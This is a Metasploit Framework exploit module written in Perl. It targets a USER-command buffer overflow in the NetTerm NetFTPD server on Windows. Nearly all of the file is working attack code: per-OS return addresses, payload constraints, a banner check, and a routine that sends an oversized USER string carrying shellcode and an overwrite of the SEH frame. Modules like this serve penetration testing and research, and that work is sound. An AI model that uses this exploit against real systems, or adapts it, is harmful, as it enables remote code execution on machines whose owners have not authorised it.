##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::netterm_netftpd_user_overflow;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info =
{
	'Name'  => 'NetTerm NetFTPD USER Buffer Overflow',
	'Version'  => '$Revision: 1.2 $',
	'Authors' => [ 'H D Moore <hdm [at] metasploit.com>' ],
	'Arch'  => [ 'x86' ],
	'OS'    => [ 'win32', 'win2000', 'winxp', 'win2003'],
	'Priv'  => 0,
	
	'AutoOpts'  => { 'EXITFUNC' => 'process' },
	
	'UserOpts'  => 
	{
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 21],
	},

	'Payload' => 
	{
		'Space'     => 1000,
		'BadChars'  => "\x00\x0a\x20\x0d",
		'Prepend'   => "\x81\xc4\x54\xf2\xff\xff",	# add esp, -3500					
		'Keys'		=> ['+ws2ord'],
	},

	'Description'  => Pex::Text::Freeform(qq{
		This module exploits a vulnerability in the NetTerm NetFTPD
		application. This package is part of the NetTerm package. This 
		module uses the USER command to trigger the overflow.
	}),

	'Refs'    =>	
	[
		['URL', 'http://seclists.org/lists/fulldisclosure/2005/Apr/0578.html'],
		['BID', 13396],
	],
	
	'DefaultTarget' => 0,
	'Targets' => 
	[	
		['NetTerm NetFTPD Universal',   0x0040df98 ], # netftpd.exe (multiple versions)
		['Windows 2000 English',        0x75022ac4 ], # ws2help.dll
		['Windows XP English SP0/SP1',  0x71aa32ad ], # ws2help.dll
		['Windows 2003 English',        0x7ffc0638 ], # peb magic :-)
		['Windows NT 4.0 SP4/SP5/SP6',  0x77681799 ], # ws2help.dll		
	],
				
	'Keys' => ['ftp'],
};

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Check {
	my $self        = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	
	my $s = Msf::Socket::Tcp->new(
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	);

	if ( $s->IsError ) {
		$self->PrintLine( '[*] Error creating socket: ' . $s->GetError );
		return $self->CheckCode('Connect');
	}
	
	my $banner = $s->Recv(-1, 5);
	$banner =~ s/\r|\n//g;
	
	$s->Close;
	
	if ($banner =~ /NetTerm FTP server/) {
		$self->PrintLine("[*] Vulnerable FTP server: $banner");
		return $self->CheckCode('Detected');
	}
	
	$self->PrintLine("[*] Unknown FTP server: $banner");
	return $self->CheckCode('Safe');	
}

sub Exploit {
	my $self        = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
	my $target      = $self->Targets->[$target_idx];

	$self->PrintLine( "[*] Attempting to exploit " . $target->[0] );

	my $s = Msf::Socket::Tcp->new(
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	);

	if ( $s->IsError ) {
		$self->PrintLine( '[*] Error creating socket: ' . $s->GetError );
		return;
	}

	# Overwrite the SEH frame and throw an exception
	my $user = Pex::Text::EnglishText(8192);
	
	# U          push ebp
	# S          push ebx
	# E          inc ebp
	# R          push edx
	# \x20\xC0   and al, al
	substr($user, 0, 1, "\xc0");
	
	substr($user, 1, length($shellcode), $shellcode);
	substr($user, 1014, 4, pack('V', $target->[1]));
	
	$s->Send("USER $user\r\n");
	$s->Recv(-1, 5);
	$s->Send("HELP\r\n");		
	return;
}

1;
